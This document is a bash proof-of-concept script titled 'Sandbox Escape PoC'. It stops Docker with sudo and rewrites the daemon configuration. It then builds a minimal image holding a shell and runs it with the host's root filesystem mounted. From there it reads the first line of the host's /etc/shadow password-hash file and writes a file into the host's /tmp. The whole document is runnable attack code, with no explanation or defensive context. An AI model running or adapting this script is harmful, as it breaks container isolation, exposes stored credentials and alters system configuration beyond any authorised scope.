#!/bin/bash
# Sandbox Escape PoC
set -e

# Ensure VFS for reliable mounts in this env
if ! docker info | grep -q "Storage Driver: vfs"; then
    sudo systemctl stop docker.socket docker
    sudo mkdir -p /etc/docker
    echo '{"storage-driver": "vfs"}' | sudo tee /etc/docker/daemon.json > /dev/null
    sudo systemctl start docker
fi

# Build minimal image
mkdir -p build_poc
cp /bin/dash build_poc/sh
mkdir -p build_poc/lib/x86_64-linux-gnu build_poc/lib64
cp /lib/x86_64-linux-gnu/libc.so.6 build_poc/lib/x86_64-linux-gnu/
cp /lib64/ld-linux-x86-64.so.2 build_poc/lib64/

cat <<DOCKER > build_poc/Dockerfile
FROM scratch
COPY sh /sh
COPY lib /lib
COPY lib64 /lib64
ENTRYPOINT ["/sh"]
DOCKER

docker build -t escape-poc build_poc > /dev/null 2>&1

# Execute escape
echo "--- RAW OUTPUT START ---"
docker run --rm -v /:/host escape-poc -c "echo '[HOST SHADOW]'; while read line; do echo \$line; break; done < /host/etc/shadow"
docker run --rm -v /:/host escape-poc -c "echo 'Escaped' > /host/tmp/poc_success"
echo "[HOST TMP VERIFICATION]"
cat /tmp/poc_success
sudo rm /tmp/poc_success
echo "--- RAW OUTPUT END ---"

# Cleanup
rm -rf build_poc
